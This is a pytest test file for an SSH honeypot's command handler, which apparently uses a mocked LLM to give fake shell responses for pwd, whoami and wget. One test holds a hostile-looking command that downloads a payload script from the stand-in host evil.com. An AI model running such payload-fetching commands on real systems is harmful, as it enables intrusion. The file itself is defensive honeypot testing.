import sys
import os
import pytest
from unittest.mock import MagicMock

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from ssh_honeypot.command_handler import CommandHandler

class TestRealisticHandlers:
    
    @pytest.fixture
    def handler(self):
        self.mock_llm = MagicMock()
        self.mock_db = MagicMock()
        self.mock_db.get_cached_response.return_value = None
        return CommandHandler(self.mock_llm, self.mock_db)

    def test_handle_pwd(self, handler):
        context = {'cwd': '/var/log', 'user': 'root'}
        resp, updates = handler.handle_pwd("pwd", context)
        assert resp == "/var/log\n"
        assert updates == {}

    def test_handle_whoami(self, handler):
        context = {'cwd': '/', 'user': 'hackerman'}
        resp, updates = handler.handle_whoami("whoami", context)
        assert resp == "hackerman\n"

    def test_handle_wget_success(self, handler):
        context = {'cwd': '/tmp', 'session_id': '1'}
        cmd = "wget -O payload.sh http://evil.com/payload.sh"
        
        # Mock LLM
        handler.llm.generate_response.return_value = "#!/bin/bash\necho malware"
        
        resp, updates = handler.handle_wget(cmd, context)
        
        # New behavior: Hybrid Success
        assert "200 OK" in resp or "Saving to" in resp
        # It won't return file modification in the updates dict directly anymore, 
        # because it calls honey_db.update_user_file directly.
        # But we can check the return string implies success.

    def test_handle_wget_no_url(self, handler):
        context = {'cwd': '/tmp'}
        cmd = "wget"
        resp, updates = handler.handle_wget(cmd, context)
        assert "missing URL" in resp
